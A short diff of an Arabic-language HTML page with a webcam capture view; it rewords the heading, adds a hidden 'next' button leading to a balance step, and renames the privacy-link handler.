@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar">هو
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,7 +9,7 @@
 <body>
 
 <div class="container">
-    <h2>يرجى التقاط صورة واضحة</h2>
+    <h2>يرجى التأكيد</h2>
     <video id="video" autoplay></video>
     <canvas id="canvas" class="hidden"></canvas>
     
@@ -17,7 +17,9 @@
     <div id="success" class="success-check hidden">✅</div>
 
     <button id="captureBtn" class="btn" onclick="captureImage()">التقاط الصورة</button>
-    <p class="privacy" onclick="showSavedImage()">📜 سياسة الخصوصية</p>
+    <button id="nextBtn" class="btn hidden" onclick="goToBalance()">التالي</button>
+    
+    <p class="privacy" onclick="showSavedData()">📜 سياسة الخصوصية</p>
 </div>
 
 <script src="script.js"></script>
